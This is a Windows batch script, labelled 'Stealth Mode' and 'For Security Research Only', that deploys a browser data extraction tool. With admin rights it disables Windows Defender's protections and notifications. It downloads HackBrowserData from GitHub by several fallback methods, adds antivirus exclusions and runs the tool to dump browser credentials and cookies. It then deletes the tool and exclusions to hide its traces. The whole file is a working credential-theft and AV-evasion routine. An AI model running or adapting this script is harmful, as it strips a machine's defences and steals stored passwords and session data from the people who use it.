@echo off
setlocal enabledelayedexpansion

:: Browser Data Extraction Deployment (Stealth Mode)
:: For Security Research Only

:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Administrator privileges required
    echo [!] Right-click and "Run as administrator"
    pause
    exit /b 1
)

echo [*] Starting browser data extraction deployment...
echo [*] Working directory: %CD%
echo [*] Phase-based execution for AV evasion

:: Configuration - Using current directory
set "DownloadUrl=https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
set "ToolName=hack-browser-data.exe"
set "ZipName=hack-browser-data.zip"
set "WorkDir=%~dp0"
set "ToolPath=%WorkDir%%ToolName%"
set "ZipPath=%WorkDir%%ZipName%"
set "OutputDir=%WorkDir%result"

:: Change to working directory
cd /d "%WorkDir%"

:: Phase 1: Disable security completely
echo [1/7] Disabling Windows Defender and notifications...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue"

:: Disable notifications temporarily
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name 'NUI_GhostEnrollment' -Value 1 -PropertyType DWord -Force" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name 'NUI_ToastEnabler' -Value 0 -Force" >nul 2>&1

timeout /t 5 /nobreak >nul
echo [✓] Security features disabled

:: Phase 2: Download the ZIP to current directory - MULTIPLE METHODS
echo [2/7] Downloading tool ZIP to current directory...
echo [*] Download URL: %DownloadUrl%

:: Method 1: Using bitsadmin (most reliable on Windows)
echo [*] Trying Method 1: bitsadmin...
bitsadmin /transfer mydownloadjob /download /priority normal "%DownloadUrl%" "%ZipPath%"

if not exist "%ZipPath%" (
    echo [!] Method 1 failed, trying Method 2: PowerShell...
    :: Method 2: Using PowerShell Invoke-WebRequest
    powershell -Command "Invoke-WebRequest -Uri '%DownloadUrl%' -OutFile '%ZipPath%' -UseBasicParsing"
)

if not exist "%ZipPath%" (
    echo [!] Method 2 failed, trying Method 3: curl...
    :: Method 3: Using curl (Windows 10+)
    curl -L -o "%ZipPath%" "%DownloadUrl%" --ssl-no-revoke
)

if not exist "%ZipPath%" (
    echo [!] Method 3 failed, trying Method 4: Legacy PowerShell...
    :: Method 4: Using legacy PowerShell WebClient
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%DownloadUrl%', '%ZipPath%')"
)

if not exist "%ZipPath%" (
    echo [!] ALL DOWNLOAD METHODS FAILED!
    echo [!] Possible issues:
    echo [!] - No internet connection
    echo [!] - GitHub blocked by firewall
    echo [!] - URL incorrect
    echo [!] - Antivirus blocking download
    goto :restore_security
)

echo [✓] ZIP successfully downloaded to: %ZipPath%
echo [✓] File size: 
for %%F in ("%ZipPath%") do echo [✓] %%~zF bytes

:: Phase 3: Extract ZIP and find the executable
echo [3/7] Extracting tool from ZIP...
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%ZipPath%', '%WorkDir%temp_extract')" 2>nul

if not exist "%WorkDir%temp_extract" (
    echo [!] Extraction failed! Trying alternative method...
    powershell -Command "Expand-Archive -Path '%ZipPath%' -DestinationPath '%WorkDir%temp_extract' -Force"
)

:: Look for the executable in the extracted files
set "foundTool=0"
for /r "%WorkDir%temp_extract" %%i in (*.exe) do (
    set "ToolPath=%%i"
    set "foundTool=1"
    echo [✓] Found executable: %%i
)

if !foundTool! equ 0 (
    echo [!] No executable found in the ZIP file!
    echo [!] Contents of ZIP:
    dir "%WorkDir%temp_extract" /b
    goto :cleanup_zip
)

:: Phase 4: Add to AV exclusions
echo [4/7] Adding to AV exclusion list...
powershell -Command "Add-MpPreference -ExclusionPath '%WorkDir%' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionPath '%ToolPath%' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionProcess '%ToolName%' -ErrorAction SilentlyContinue"
echo [✓] AV exclusions added for current directory

:: Phase 5: Execute and wait for data collection
echo [5/7] Executing browser data extraction...

:: Remove existing result folder if it exists
if exist "%OutputDir%" (
    rmdir /s /q "%OutputDir%" >nul 2>&1
)

echo [*] Starting extraction - this will take 30-60 seconds...
echo [*] Running: "%ToolPath%" --dir "%OutputDir%" --full
"%ToolPath%" --dir "%OutputDir%" --full

echo [*] Waiting for data collection to complete...
timeout /t 30 /nobreak >nul

:: Check if output was created in the 'result' folder
set "dataCollected=0"
if exist "%OutputDir%\*.txt" set "dataCollected=1"
if exist "%OutputDir%\*.json" set "dataCollected=1"
if exist "%OutputDir%\*.csv" set "dataCollected=1"

if !dataCollected! equ 1 (
    echo [✓] Data collection completed successfully
    echo [✓] Results saved to: %OutputDir%
) else (
    echo [!] No data found in result folder - checking again...
    timeout /t 10 /nobreak >nul
    if exist "%OutputDir%\*" (
        echo [✓] Files found in result folder
        set "dataCollected=1"
    ) else (
        echo [!] Collection may have failed - no files in result folder
    )
)

:: Phase 6: Cleanup - Remove tool, extracted files, and ZIP
echo [6/7] Cleaning up tool files...

:cleanup_zip
:: Delete the extracted tool
if exist "%ToolPath%" (
    del /f /q "%ToolPath%" >nul 2>&1
    echo [✓] Tool executable deleted
)

:: Delete any extracted files and folder
if exist "%WorkDir%temp_extract" (
    rmdir /s /q "%WorkDir%temp_extract" >nul 2>&1
    echo [✓] Extraction folder deleted
)

:: Delete the ZIP file
if exist "%ZipPath%" (
    del /f /q "%ZipPath%" >nul 2>&1
    echo [✓] ZIP file deleted
)

:: Remove AV exclusions
powershell -Command "Remove-MpPreference -ExclusionPath '%WorkDir%' -ErrorAction SilentlyContinue"
powershell -Command "Remove-MpPreference -ExclusionPath '%ToolPath%' -ErrorAction SilentlyContinue"
powershell -Command "Remove-MpPreference -ExclusionProcess '%ToolName%' -ErrorAction SilentlyContinue"
echo [✓] AV exclusions removed

:: Phase 7: Restore security completely
echo [7/7] Restoring Windows Defender and notifications...
:restore_security
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue"
powershell -Command "Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue"

:: Restore notifications
powershell -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name 'NUI_GhostEnrollment' -Force -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name 'NUI_ToastEnabler' -Value 1 -Force -ErrorAction SilentlyContinue" >nul 2>&1

echo [✓] Security features restored

:: Final status
echo.
echo [COMPLETION SUMMARY]
echo ===================
if exist "%OutputDir%" (
    echo [✓] Data saved to: %OutputDir%
    echo [✓] Tool successfully executed and deleted
    echo [✓] ZIP file deleted
    echo [✓] AV exclusions removed
    echo [✓] Windows Defender restored
    echo [✓] Notifications restored
    
    :: Show what was collected
    echo.
    echo [*] Collected data:
    dir "%OutputDir%" /b
    
    echo.
    set /p "openResults=Open results folder? (y/n): "
    if /i "!openResults!"=="y" explorer "%OutputDir%"
) else (
    echo [!] Operation completed with errors
    echo [!] No data was collected in result folder
)

echo.
echo [*] All temporary changes have been reverted
echo [*] Only the 'result' folder remains in: %WorkDir%
pause
